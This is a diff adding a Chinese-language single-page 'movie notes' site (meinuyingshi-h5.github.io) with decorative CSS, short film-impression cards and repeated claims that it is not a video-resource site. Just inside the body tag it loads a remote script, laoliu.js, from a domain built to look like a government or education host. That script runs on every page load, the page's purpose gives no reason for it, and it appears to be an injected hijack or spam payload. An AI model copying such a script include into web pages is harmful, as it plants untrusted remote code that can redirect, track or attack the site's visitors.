@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>莓纽映画 - 一串观感，慢慢串起来 | meinuyingshi-h5.github.io</title>
+<meta name="description" content="莓纽映画(meinuyingshi-h5.github.io)是线装时序式观影手记单页，把散片像莓果一样一颗颗串起，只记观感与片刻，不提供影视资源、不嵌播放源。" />
+<meta name="keywords" content="莓纽映画,meinuyingshi-h5,观影手记,时序轴,莓果片单" />
+<style>
+:root{
+  --paper:#f6f4f0; --paper2:#ece7dd; --berry:#e8576f; --berry2:#b23a52;
+  --leaf:#4a7a5e; --leaf2:#365540; --ink:#2b2926; --ink2:#514c45; --ink3:#8a8378;
+  --twine:rgba(74,122,94,0.34); --shadow:0 8px 24px rgba(43,41,38,0.11);
+  --shadow2:0 18px 44px rgba(178,58,82,0.24);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",serif,sans-serif;
+  background:
+    radial-gradient(circle at 22% 16%,rgba(232,87,111,0.09),transparent 46%),
+    radial-gradient(circle at 78% 86%,rgba(74,122,94,0.10),transparent 48%),
+    var(--paper);
+  color:var(--ink);line-height:1.9;overflow-x:hidden;
+}
+a{color:var(--leaf2);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 露珠 */
+.dew{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.dew i{position:absolute;width:7px;height:9px;border-radius:50% 50% 50% 40%;background:rgba(255,255,255,0.55);box-shadow:0 1px 3px rgba(43,41,38,0.12);animation:drop 13s ease-in-out infinite;opacity:.6}
+.dew i:nth-child(1){left:10%;top:-14px;animation-delay:0s}
+.dew i:nth-child(2){left:30%;top:-14px;width:5px;height:7px;animation-delay:2.2s}
+.dew i:nth-child(3){left:58%;top:-14px;animation-delay:5.4s}
+.dew i:nth-child(4){left:78%;top:-14px;width:6px;height:8px;animation-delay:1.6s}
+.dew i:nth-child(5){left:92%;top:-14px;animation-delay:3.8s}
+@keyframes drop{0%{transform:translateY(0);opacity:.5}85%{opacity:.65}100%{transform:translateY(104vh);opacity:0}}
+
+/* 莓果头 */
+.berry-head{position:relative;z-index:10;text-align:center;padding:56px 20px 44px;background:linear-gradient(180deg,var(--paper2),var(--paper));border-bottom:3px solid var(--berry2)}
+.fruit{width:86px;height:86px;margin:0 auto 16px;position:relative}
+.fruit .body{position:absolute;inset:8px;border-radius:50% 50% 48% 52%;background:radial-gradient(circle at 34% 30%,#f7a9b8,var(--berry) 55%,var(--berry2));box-shadow:var(--shadow);animation:bob 5s ease-in-out infinite}
+.fruit .cap{position:absolute;top:-6px;left:50%;transform:translateX(-50%);width:30px;height:14px;background:var(--leaf);border-radius:0 0 12px 12px;transform-origin:bottom center;animation:sway 4s ease-in-out infinite}
+.fruit .cap::before,.fruit .cap::after{content:"";position:absolute;top:0;width:12px;height:12px;background:var(--leaf);border-radius:50%}
+.fruit .cap::before{left:-6px}
+.fruit .cap::after{right:-6px}
+.fruit .dot{position:absolute;inset:0;z-index:2;display:flex;align-items:center;justify-content:center;font-size:26px}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+@keyframes sway{0%,100%{transform:translateX(-50%) rotate(-4deg)}50%{transform:translateX(-50%) rotate(4deg)}}
+.berry-head h1{font-size:33px;font-weight:900;letter-spacing:8px;color:var(--ink)}
+.berry-head h1 b{color:var(--berry2)}
+.note-line{margin:8px auto 0;max-width:640px;font-size:12px;color:var(--berry2);background:rgba(255,255,255,0.74);border:1px dashed var(--berry2);border-radius:8px;padding:6px 12px}
+.berry-head p{max-width:560px;margin:10px auto 0;color:var(--ink2);font-size:15px}
+.nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:9px 20px;border:1px solid var(--leaf);border-radius:999px;font-size:14px;font-weight:700;color:var(--ink);background:rgba(255,255,255,0.6);transition:.25s}
+.nav a:hover{background:var(--berry);border-color:var(--berry2);color:#fff}
+
+.bar{position:relative;z-index:10;background:var(--ink);color:var(--paper);padding:10px 20px;font-size:13px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap}
+.bar b{color:var(--berry)}
+
+.wrap{position:relative;z-index:10;max-width:900px;margin:0 auto;padding:0 18px 60px}
+
+/* 纵贯时序轴 */
+.section{margin-bottom:60px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:34px}
+.sec-title .knot{width:34px;height:34px;background:var(--berry2);color:#fff;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:900;border-radius:50%;flex-shrink:0;box-shadow:inset 0 0 0 3px rgba(255,255,255,0.3)}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--leaf2)}
+.sec-title .ln{flex:1;height:1px;background:linear-gradient(90deg,var(--twine),transparent)}
+
+.twine{position:relative;padding-left:44px}
+.twine::before{content:"";position:absolute;top:8px;bottom:8px;left:13px;width:3px;background:repeating-linear-gradient(180deg,var(--leaf) 0 8px,transparent 8px 16px);opacity:.6}
+.node{position:relative;margin-bottom:26px}
+.node::before{content:"";position:absolute;top:20px;left:-35px;width:17px;height:17px;border:3px solid var(--berry2);border-radius:50%;background:var(--paper);box-shadow:0 0 0 3px var(--paper),0 0 0 5px rgba(178,58,82,0.16);z-index:2}
+.node.right .card{margin-left:auto}
+.card{width:min(560px,100%);background:#fffdf9;border:1px solid var(--berry);border-radius:14px 40px 14px 14px;padding:22px 24px 24px;box-shadow:var(--shadow);transition:.4s;position:relative;overflow:hidden}
+.card::after{content:"";position:absolute;top:12px;right:12px;width:14px;height:14px;border-radius:50%;background:var(--berry);opacity:.16;transition:.4s}
+.node:hover .card{transform:translateY(-4px);box-shadow:var(--shadow2);border-color:var(--berry2);border-radius:14px}
+.node:hover .card::after{opacity:.55;transform:scale(1.5)}
+.card .when{font-family:"Courier New",monospace;font-size:12px;color:var(--leaf2);letter-spacing:1px}
+.card h3{font-size:18px;font-weight:800;color:var(--ink);margin:4px 0 6px}
+.card p{font-size:14px;color:var(--ink2);line-height:1.85}
+.card .tag{display:inline-block;margin-top:10px;font-size:11px;color:var(--paper);background:var(--leaf2);padding:3px 11px;border-radius:999px}
+.node:nth-child(odd) .card{border-radius:40px 14px 14px 14px}
+
+/* 熟度刻度：竖向渐变条 + 刻度点 */
+.ripe-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;align-items:stretch}
+.ripe{background:#fffdf9;border:1px solid var(--berry);border-radius:14px;padding:18px 16px;transition:.25s;cursor:default;position:relative;overflow:hidden}
+.ripe::before{content:"";position:absolute;left:0;bottom:0;width:100%;height:var(--h,20%);background:linear-gradient(0deg,var(--berry),var(--berry2));opacity:.55;transition:.4s}
+.ripe:hover{border-color:var(--berry2);transform:translateY(-4px)}
+.ripe:hover::before{opacity:.85}
+.ripe .n{font-family:"Songti SC",serif;font-size:20px;font-weight:900;color:var(--berry2);position:relative}
+.ripe h4{font-size:15px;font-weight:800;color:var(--ink);margin-top:2px;position:relative}
+.ripe p{font-size:12px;color:var(--ink3);margin-top:6px;position:relative}
+
+.about-block{background:#fffdf9;border:1px solid var(--berry);border-left:8px solid var(--berry2);border-radius:8px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95}
+.about-block b{color:var(--berry2)}
+
+.cord{position:relative;z-index:10;background:var(--paper2);color:var(--ink);padding:14px 20px;text-align:center;font-size:13px;display:flex;gap:20px;justify-content:center;flex-wrap:wrap;border-top:1px dashed var(--berry)}
+.cord .bead{display:inline-block;width:10px;height:10px;border-radius:50%;background:var(--berry);margin:0 2px;animation:slide 2.4s ease-in-out infinite}
+.cord .bead:nth-child(2){animation-delay:.2s}
+.cord .bead:nth-child(3){animation-delay:.4s}
+@keyframes slide{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:3px solid var(--berry2);background:var(--paper2)}
+
+@media(max-width:640px){
+  .berry-head h1{font-size:25px;letter-spacing:4px}
+  .fruit{width:72px;height:72px}
+  .twine{padding-left:34px}
+  .node::before{left:-25px;width:14px;height:14px}
+  .card{border-radius:14px 30px 14px 14px!important}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .ripe-grid{grid-template-columns:repeat(2,1fr)}
+  .bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="dew" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i></div>
+
+<header class="berry-head">
+  <div class="fruit"><span class="cap"></span><span class="dot">🫐</span></div>
+  <h1><b>莓纽</b>映画</h1>
+  <div class="note-line">⚠ 本页取「莓果一颗、线头一结」之意，<b>是观影手记，不是影视资源站</b>：不列片名索引、不嵌播放源、不提供下载/网盘/搜索/全集入口，不含任何擦边或低俗内容。</div>
+  <p>meinuyingshi-h5.github.io —— 散片像莓子，熟一颗串一颗。不追着看，等它自己甜。</p>
+  <nav class="nav">
+    <a href="#">藤上</a>
+    <a href="#twine">一串观感</a>
+    <a href="#ripe">熟度刻度</a>
+    <a href="#about">关于莓纽</a>
+  </nav>
+</header>
+
+<div class="bar">
+  <span>🫐 性质：<b>观影手记 / 非资源站</b></span>
+  <span>🚫 无：片库 · 播放源 · 搜索 · 网盘 · 下载 · 擦边内容</span>
+  <span>✅ 只有：片刻 · 观感 · 熟度</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="twine">
+    <div class="sec-title"><span class="knot">串</span><h2>一串观感</h2><span class="ln"></span></div>
+    <div class="twine">
+      <div class="node">
+        <div class="card">
+          <div class="when">NO.01 · 雨先到</div>
+          <h3>声音比人先进门</h3>
+          <p>好片子都舍得浪费半分钟雨声。雨把屋子压静了，观众才肯坐下——这时候哪怕什么都不演，也已经开场了。</p>
+          <span class="tag">酸涩 · 开场</span>
+        </div>
+      </div>
+      <div class="node right">
+        <div class="card">
+          <div class="when">NO.02 · 桥很长</div>
+          <h3>镜头偏不拍那张脸</h3>
+          <p>只拍脚，一步一步。话压到最短，剪辑替角色憋着不喘。这种克制比十句台词都贵，也最容易被快进错过。</p>
+          <span class="tag">紧实 · 中段</span>
+        </div>
+      </div>
+      <div class="node">
+        <div class="card">
+          <div class="when">NO.03 · 灶台边</div>
+          <h3>被锅铲吞掉的一半</h3>
+          <p>炒菜声盖了半句对白，字幕没补。反倒记住那个节奏——有些关系，就靠听不见的那半句撑着，谁也没打算说破。</p>
+          <span class="tag">回甘 · 家常</span>
+        </div>
+      </div>
+      <div class="node right">
+        <div class="card">
+          <div class="when">NO.04 · 雪停了</div>
+          <h3>连配乐都屏住气</h3>
+          <p>雪一停，音也跟着断。安静到能听见自己心跳，才知道前面一直在替你绷着弦。这一颗，熟得刚好。</p>
+          <span class="tag">绵甜 · 转场</span>
+        </div>
+      </div>
+      <div class="node">
+        <div class="card">
+          <div class="when">NO.05 · 空房间</div>
+          <h3>人走了，镜头还停着</h3>
+          <p>别快进那十秒。那是留给你自己的：你想起来的那个人，就是这串里最淡、也最久的一颗，放久了反而最亮。</p>
+          <span class="tag">余味 · 收尾</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="ripe">
+    <div class="sec-title"><span class="knot">度</span><h2>熟度刻度</h2><span class="ln"></span></div>
+    <div class="ripe-grid">
+      <div class="ripe" style="--h:20%"><div class="n">壹</div><h4>青硬</h4><p>开场闷、节奏慢，想关。再等十分钟。</p></div>
+      <div class="ripe" style="--h:38%"><div class="n">贰</div><h4>转酸</h4><p>开始皱眉，人物还不讨喜。</p></div>
+      <div class="ripe" style="--h:55%"><div class="n">叁</div><h4>将熟</h4><p>有一场戏突然对了，坐直了。</p></div>
+      <div class="ripe" style="--h:72%"><div class="n">肆</div><h4>透甜</h4><p>配乐一响，鼻子先知道。</p></div>
+      <div class="ripe" style="--h:88%"><div class="n">伍</div><h4>软烂</h4><p>哭完没力气动，得缓一会儿。</p></div>
+      <div class="ripe" style="--h:100%"><div class="n">陆</div><h4>留核</h4><p>故事忘了，那口气还记得。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="knot">ℹ</span><h2>关于莓纽</h2><span class="ln"></span></div>
+    <div class="about-block">
+      <p>
+        <b>莓纽映画</b>（meinuyingshi-h5.github.io）是一个<b>线装时序式观影手记单页</b>，名字取「莓果一颗、线头一结」——
+        把散掉的观感串成一串，而不是把片子码成一个库。它<b>不是影视资源站、不是片库、不是搜索或聚合工具</b>：
+        页面不列具体影视作品名称，不提供播放、下载、网盘、磁力、在线观看等任何指向资源的动作，
+        也不嵌入第三方播放源、不抓取外链、不做「全集 / 高清 / 最新 / 抢先看」等引导，更不含擦边、低俗或引流内容。
+        这里只有「看到哪一刻心里动了一下」的片刻记录，记的是<b>怎么看</b>，不是<b>去哪看</b>。
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，内容仅供个人交流。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="cord">
+  <span><span class="bead"></span><span class="bead"></span><span class="bead"></span> 线头系在 NO.05 · 暂不往下串</span>
+  <span>🫐 已串：5 颗</span>
+  <span>🪢 状态：等它自己熟</span>
+</div>
+
+<footer class="footer">
+  © 2026 莓纽映画（个人手记） | meinuyingshi-h5.github.io | 不列片库、不放片源、无擦边内容、不提供下载 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
